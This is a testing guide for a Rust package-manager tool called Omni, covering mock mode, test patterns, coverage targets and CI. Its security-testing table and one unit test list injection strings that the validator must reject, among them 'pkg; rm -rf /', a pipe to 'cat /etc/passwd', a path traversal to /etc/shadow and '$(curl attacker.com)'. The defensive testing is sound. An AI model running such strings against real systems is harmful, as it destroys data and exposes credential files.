<div align="center">

```
 ██████╗ ███╗   ███╗███╗   ██╗██╗
██╔═══██╗████╗ ████║████╗  ██║██║
██║   ██║██╔████╔██║██╔██╗ ██║██║
██║   ██║██║╚██╔╝██║██║╚██╗██║██║
╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝
```

**Testing Guide**

</div>

---

## Running the Test Suite

```bash
# All tests
cargo test

# With output visible
cargo test -- --nocapture

# A specific module
cargo test security

# Benchmarks (requires nightly or criterion setup)
cargo bench --no-run
```

---

## Test Categories

### Unit Tests

Unit tests live inline in each source file under `#[cfg(test)]` blocks. They test individual functions and components in isolation — no package managers, no network, no database files on disk.

```bash
cargo test --lib
```

Key modules with inline unit tests:

| Module | What is tested |
|--------|---------------|
| `secure_executor.rs` | Whitelist validation, argument sanitization |
| `distro.rs` | OS and package manager detection |
| `config.rs` | YAML parsing, default values |
| `database.rs` | Schema creation, WAL mode |
| `resolver.rs` | Platform-specific manager priority |

### Integration Tests

Integration tests live in `tests/`. They test complete workflows using the compiled binary via `std::process::Command`.

```bash
cargo test --test integration_tests
```

All integration tests that invoke real package operations must use mock mode:

```bash
./target/debug/omni --mock install firefox
./target/debug/omni --mock remove curl
./target/debug/omni --mock update --all
```

Mock mode runs the full code path — argument validation, security checks, database writes — but replaces the actual subprocess execution with a no-op. It is safe in CI and on any machine regardless of what package managers are installed.

---

## Mock Mode

The `--mock` flag is the primary tool for safe local and CI testing. Use it for any test that would otherwise touch installed packages.

```bash
omni --mock install git
omni --mock remove vim
omni --mock update --all
omni --mock snapshot create test-state
omni --mock history show
```

Mock mode exercises:
- Input validation and argument sanitization via `SecureExecutor`
- Database reads and writes (uses the real SQLite database)
- History recording
- The full CLI parsing layer

Mock mode skips:
- Spawning any subprocess to a native package manager
- Any network calls

---

## Writing Tests

### Unit Test Pattern

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sanitize_rejects_shell_injection() {
        let executor = SecureExecutor::new();
        let result = executor.sanitize_argument("pkg; rm -rf /");
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_accepts_valid_package_name() {
        let executor = SecureExecutor::new();
        let result = executor.sanitize_argument("firefox");
        assert!(result.is_ok());
    }
}
```

Rules for unit tests:
- No `unwrap()` in assertions — use `assert!(x.is_ok())` or `assert_matches!`
- No filesystem side effects without `TempDir`
- No network calls — mock or skip

### Async Test Pattern

Omni is async throughout. Use `#[tokio::test]` for any test that touches async functions.

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_database_creates_tables_on_init() {
        let db = Database::new_in_memory().await.unwrap();
        let result = db.get_install_history(10).await;
        assert!(result.is_ok());
    }
}
```

### Integration Test Pattern

```rust
use std::process::Command;

#[test]
fn test_mock_install_records_to_history() {
    let install = Command::new("cargo")
        .args(["run", "--", "--mock", "install", "curl"])
        .output()
        .expect("binary failed to start");

    assert!(install.status.success());

    let history = Command::new("cargo")
        .args(["run", "--", "history", "show"])
        .output()
        .expect("binary failed to start");

    let stdout = String::from_utf8_lossy(&history.stdout);
    assert!(stdout.contains("curl"));
}
```

---

## Security Testing

The security subsystem has its own test scope. These tests verify that the `SecureExecutor` and input validation layers reject malformed input before any subprocess is spawned.

```bash
cargo test secure_executor
cargo test input_validation
```

Inputs that must be rejected:

| Pattern | Reason |
|---------|--------|
| `pkg; rm -rf /` | Shell injection via `;` |
| `pkg \| cat /etc/passwd` | Pipe injection |
| `../../../etc/shadow` | Path traversal |
| `$(curl attacker.com)` | Command substitution |
| String longer than 1,024 chars | Buffer abuse |

Every rejected input must produce an `Err`, not a panic. The tests confirm both the rejection and the error message content.

---

## Environment Setup

```bash
# Format check (required before any commit)
cargo fmt --check

# Linting (no warnings allowed)
cargo clippy -- -D warnings

# Dependency security audit
cargo install cargo-audit
cargo audit

# Code coverage (optional, Linux only)
cargo install cargo-tarpaulin
cargo tarpaulin --out Html --output-dir target/coverage
```

Coverage targets for v1.0.0:

| Area | Target |
|------|--------|
| `secure_executor.rs` | 95%+ |
| `database.rs` | 90%+ |
| `config.rs` | 85%+ |
| `boxes/` (per-PM wrappers) | 70%+ |
| `gui.rs` | Not measured (UI) |

---

## Container Testing

To verify behavior across Linux distributions without affecting your host:

```bash
# Ubuntu / apt
docker run --rm -it ubuntu:22.04 bash

# Fedora / dnf
docker run --rm -it fedora:latest bash

# Arch / pacman
docker run --rm -it archlinux:latest bash
```

Inside each container: install Rust via rustup, clone the repo, `cargo build`, and run the mock-mode tests. This confirms distro detection and manager selection logic for each target environment.

---

## Pre-Commit Checklist

Before opening a pull request:

```bash
cargo fmt
cargo clippy -- -D warnings
cargo test
cargo audit
cargo test -- --nocapture 2>&1 | grep -i "FAILED\|panic"
```

All tests must pass. No clippy warnings. No audit advisories at `error` severity.

---

## Continuous Integration

The GitHub Actions workflow runs on every push and pull request:

1. `cargo fmt --check` — formatting
2. `cargo clippy -- -D warnings` — linting
3. `cargo test` — full test suite
4. `cargo audit` — dependency security scan
5. Cross-platform build matrix: `ubuntu-latest`, `macos-latest`, `windows-latest`

A failing CI run blocks merge. There are no exceptions.

---

[Back to README](README.md) · [Contributing](CONTRIBUTING.md) · [Security](SECURITY.md)
